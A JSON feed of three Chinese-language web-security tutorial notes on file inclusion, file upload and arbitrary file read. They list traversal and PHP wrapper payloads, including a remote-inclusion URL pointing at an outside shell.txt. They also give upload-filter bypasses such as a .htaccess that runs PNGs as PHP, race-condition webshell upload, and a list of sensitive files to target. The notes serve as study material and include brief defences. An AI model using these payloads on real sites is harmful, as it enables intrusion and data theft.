{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"目录\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/includefile/",
            "title": "文件包含",
            "date_published": "2022-11-26T13:02:44.000Z",
            "content_html": "<h2 id=\"基础\"><a class=\"anchor\" href=\"#基础\">#</a> 基础</h2>\n<p>常见的文件包含漏洞的形式为  <code>&lt;?php include(&quot;inc/&quot; . $_GET['file']); ?&gt;</code></p>\n<p>考虑常用的几种包含方式为</p>\n<ul>\n<li>同目录包含  <code>file=.htaccess</code></li>\n<li>目录遍历  <code>?file=../../../../../../../../../var/lib/locate.db</code></li>\n<li>日志注入  <code>?file=../../../../../../../../../var/log/apache/error.log</code></li>\n<li>利用  <code>/proc/self/environ</code></li>\n</ul>\n<p>其中日志可以使用 SSH 日志或者 Web 日志等多种日志来源测试</p>\n<h2 id=\"触发sink\"><a class=\"anchor\" href=\"#触发sink\">#</a> 触发 Sink</h2>\n<ul>\n<li>PHP\n<ul>\n<li>include\n<ul>\n<li>在包含过程中出错会报错，不影响执行后续语句</li>\n</ul>\n</li>\n<li>include_once\n<ul>\n<li>仅包含一次</li>\n</ul>\n</li>\n<li>require\n<ul>\n<li>在包含过程中出错，就会直接退出，不执行后续语句</li>\n</ul>\n</li>\n<li>require_once</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"绕过技巧\"><a class=\"anchor\" href=\"#绕过技巧\">#</a> 绕过技巧</h2>\n<p>常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式</p>\n<h3 id=\"url编码绕过\"><a class=\"anchor\" href=\"#url编码绕过\">#</a> url 编码绕过</h3>\n<p>如果 WAF 中是字符串匹配，可以使用 url 多次编码的方式可以绕过</p>\n<h3 id=\"特殊字符绕过\"><a class=\"anchor\" href=\"#特殊字符绕过\">#</a> 特殊字符绕过</h3>\n<ul>\n<li>某些情况下，读文件支持使用 Shell 通配符，如  <code>?</code>   <code>*</code>  等</li>\n<li>url 中 使用  <code>?</code>   <code>#</code>  可能会影响 include 包含的结果</li>\n<li>某些情况下，unicode 编码不同但是字形相近的字符有同一个效果</li>\n</ul>\n<h3 id=\"00截断\"><a class=\"anchor\" href=\"#00截断\">#</a> %00 截断</h3>\n<p>几乎是最常用的方法，条件是  <code>magic_quotes_gpc</code>  关闭，而且 php 版本小于 5.3.4。</p>\n<h3 id=\"长度截断\"><a class=\"anchor\" href=\"#长度截断\">#</a> 长度截断</h3>\n<p>Windows 上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为 259 个 bytes。</p>\n<p>msdn 定义  <code>#define MAX_PATH 260</code> ，其中第 260 个字符为字符串结尾的  <code>\\0</code>  ，而 linux 可以用 getconf 来判断文件名长度限制和文件路径长度限制。</p>\n<p>获取最长文件路径长度：getconf PATH_MAX /root 得到 4096 获取最长文件名：getconf NAME_MAX /root 得到 255</p>\n<p>那么在长度有限的时候， <code>././././</code>  (n 个) 的形式就可以通过这个把路径爆掉</p>\n<p>在 php 代码包含中，这种绕过方式要求 php 版本 &lt; php 5.2.8</p>\n<h3 id=\"伪协议绕过\"><a class=\"anchor\" href=\"#伪协议绕过\">#</a> 伪协议绕过</h3>\n<ul>\n<li>远程包含：要求  <code>allow_url_fopen=On</code>  且  <code>allow_url_include=On</code>  ， payload 为  <code>?file=[http|https|ftp]://websec.wordpress.com/shell.txt</code>  的形式</li>\n<li>PHP input: 把 payload 放在 POST 参数中作为包含的文件，要求  <code>allow_url_include=On</code>  ，payload 为  <code>?file=php://input</code>  的形式</li>\n<li>Base64: 使用 Base64 伪协议读取文件，payload 为  <code>?file=php://filter/convert.base64-encode/resource=index.php</code>  的形式</li>\n<li>data: 使用 data 伪协议读取文件，payload 为  <code>?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=</code>  的形式，要求  <code>allow_url_include=On</code></li>\n</ul>\n<h3 id=\"协议绕过\"><a class=\"anchor\" href=\"#协议绕过\">#</a> 协议绕过</h3>\n<p><code>allow_url_fopen</code>  和  <code>allow_url_include</code>  主要是针对  <code>http</code>   <code>ftp</code>  两种协议起作用，因此可以使用 SMB、WebDav 协议等方式来绕过限制。</p>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2R4eS5tZS8/cD03NTI=\">Exploit with PHP Protocols</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGZpLWNoZWF0LXNoZWV0Lw==\">lfi cheat sheet</span></li>\n</ul>\n",
            "tags": [
                "包含",
                "文件",
                "目录"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/uploadfile/",
            "title": "文件上传",
            "date_published": "2022-11-26T12:58:44.000Z",
            "content_html": "<h1 id=\"文件类型检测绕过\"><a class=\"anchor\" href=\"#文件类型检测绕过\">#</a> 文件类型检测绕过</h1>\n<h2 id=\"更改请求绕过\"><a class=\"anchor\" href=\"#更改请求绕过\">#</a> 更改请求绕过</h2>\n<p>有的站点仅仅在前端检测了文件类型，这种类型的检测可以直接修改网络请求绕过。 同样的，有的站点在后端仅检查了 HTTP Header 中的信息，比如  <code>Content-Type</code>  等，这种检查同样可以通过修改网络请求绕过。</p>\n<h2 id=\"magic检测绕过\"><a class=\"anchor\" href=\"#magic检测绕过\">#</a> Magic 检测绕过</h2>\n<p>有的站点使用文件头来检测文件类型，这种检查可以在 Shell 前加入对应的字节以绕过检查。几种常见的文件类型的头字节如下表所示</p>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>十六进制值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>JPG</td>\n<td>FF D8 FF E0 00 10 4A 46 49 46</td>\n</tr>\n<tr>\n<td>GIF</td>\n<td>47 49 46 38 39 61</td>\n</tr>\n<tr>\n<td>PNG</td>\n<td>89 50 4E 47</td>\n</tr>\n<tr>\n<td>TIF</td>\n<td>49 49 2A 00</td>\n</tr>\n<tr>\n<td>BMP</td>\n<td>42 4D</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"后缀绕过\"><a class=\"anchor\" href=\"#后缀绕过\">#</a> 后缀绕过</h2>\n<p>部分服务仅根据后缀、上传时的信息或 Magic Header 来判断文件类型，此时可以绕过。</p>\n<p>php 由于历史原因，部分解释器可能支持符合正则  <code>/ph(p[2-7]?|t(ml)?)/</code>  的后缀，如  <code>php</code>  /  <code>php5</code>  /  <code>pht</code>  /  <code>phtml</code>  /  <code>shtml</code>  /  <code>pwml</code>  /  <code>phtm</code>  等 可在禁止上传 php 文件时测试该类型。</p>\n<p>jsp 引擎则可能会解析  <code>jspx</code>  /  <code>jspf</code>  /  <code>jspa</code>  /  <code>jsw</code>  /  <code>jsv</code>  /  <code>jtml</code>  等后缀，asp 支持  <code>asa</code>  /  <code>asax</code>  /  <code>cer</code>  /  <code>cdx</code>  /  <code>aspx</code>  /  <code>ascx</code>  /  <code>ashx</code>  /  <code>asmx</code>  /  <code>asp&#123;80-90&#125;</code>  等后缀。</p>\n<p>除了这些绕过，其他的后缀同样可能带来问题，如  <code>vbs</code>  /  <code>asis</code>  /  <code>sh</code>  /  <code>reg</code>  /  <code>cgi</code>  /  <code>exe</code>  /  <code>dll</code>  /  <code>com</code>  /  <code>bat</code>  /  <code>pl</code>  /  <code>cfc</code>  /  <code>cfm</code>  /  <code>ini</code>  等。</p>\n<h2 id=\"系统命名绕过\"><a class=\"anchor\" href=\"#系统命名绕过\">#</a> 系统命名绕过</h2>\n<p>在 Windows 系统中，上传  <code>index.php.</code>  会重命名为  <code>.</code>  ，可以绕过后缀检查。 也可尝试  <code>index.php%20</code>  ，  <code>index.php:1.jpg</code>   <code>index.php::$DATA</code>  等。 在 Linux 系统中，可以尝试上传名为  <code>index.php/.</code>  或  <code>./aa/../index.php/.</code>  的文件</p>\n<h2 id=\"userini\"><a class=\"anchor\" href=\"#userini\">#</a> .user.ini</h2>\n<p>在 php 执行的过程中，除了主  <code>php.ini</code>  之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER ['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。  <code>.user.ini</code>  中可以定义除了 PHP_INI_SYSTEM 以外的模式的选项，故可以使用  <code>.user.ini</code>  加上非 php 后缀的文件构造一个 shell，比如  <code>auto_prepend_file=01.gif</code>  。</p>\n<h2 id=\"waf绕过\"><a class=\"anchor\" href=\"#waf绕过\">#</a> WAF 绕过</h2>\n<p>有的 waf 在编写过程中考虑到性能原因，只处理一部分数据，这时可以通过加入大量垃圾数据来绕过其处理函数。</p>\n<p>另外，Waf 和 Web 系统对  <code>boundary</code>  的处理不一致，可以使用错误的  <code>boundary</code>  来完成绕过。</p>\n<h2 id=\"竞争上传绕过\"><a class=\"anchor\" href=\"#竞争上传绕过\">#</a> 竞争上传绕过</h2>\n<p>有的服务器采用了先保存，再删除不合法文件的方式，在这种服务器中，可以反复上传一个会生成 Web Shell 的文件并尝试访问，多次之后即可获得 Shell。</p>\n<h1 id=\"攻击技巧\"><a class=\"anchor\" href=\"#攻击技巧\">#</a> 攻击技巧</h1>\n<h2 id=\"apache重写getshell\"><a class=\"anchor\" href=\"#apache重写getshell\">#</a> Apache 重写 GetShell</h2>\n<p>Apache 可根据是否允许重定向考虑上传.htaccess</p>\n<p>内容为</p>\n<pre><code>AddType application/x-httpd-php .png\nphp_flag engine 1\n</code></pre>\n<p>就可以用 png 或者其他后缀的文件做 php 脚本了</p>\n<h2 id=\"软链接任意读文件\"><a class=\"anchor\" href=\"#软链接任意读文件\">#</a> 软链接任意读文件</h2>\n<p>上传的压缩包文件会被解压的文件时，可以考虑上传含符号链接的文件 若服务器没有做好防护，可实现任意文件读取的效果</p>\n<h1 id=\"防护技巧\"><a class=\"anchor\" href=\"#防护技巧\">#</a> 防护技巧</h1>\n<ul>\n<li>使用白名单限制上传文件的类型</li>\n<li>使用更严格的文件类型检查方式</li>\n<li>限制 Web Server 对上传文件夹的解析</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4ODQ2NC5odG1s\">构造优质上传漏洞 Fuzz 字典</span></li>\n</ul>\n",
            "tags": [
                "目录",
                "上传"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/readfile/",
            "title": "文件读取",
            "date_published": "2022-11-26T12:49:44.000Z",
            "content_html": "<p>考虑读取可能有敏感信息的文件</p>\n<ul>\n<li>用户目录下的敏感文件\n<ul>\n<li>.bash_history</li>\n<li>.zsh_history</li>\n<li>.profile</li>\n<li>.bashrc</li>\n<li>.gitconfig</li>\n<li>.viminfopasswd</li>\n</ul>\n</li>\n<li>应用的配置文件\n<ul>\n<li>/etc/apache2/apache2.conf</li>\n<li>/etc/nginx/nginx.conf</li>\n</ul>\n</li>\n<li>应用的日志文件\n<ul>\n<li>/var/log/apache2/access.log</li>\n<li>/var/log/nginx/access.log</li>\n</ul>\n</li>\n<li>站点目录下的敏感文件\n<ul>\n<li>.svn/entries</li>\n<li>.git/HEAD</li>\n<li>WEB-INF/web.xml</li>\n<li>.htaccess</li>\n</ul>\n</li>\n<li>特殊的备份文件\n<ul>\n<li>.swp</li>\n<li>.swo</li>\n<li>.bak</li>\n<li>index.php~</li>\n<li>...</li>\n</ul>\n</li>\n<li>Python 的 Cache\n<ul>\n<li><code>__pycache__\\__init__.cpython-35.pyc</code></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "目录",
                "读取"
            ]
        }
    ]
}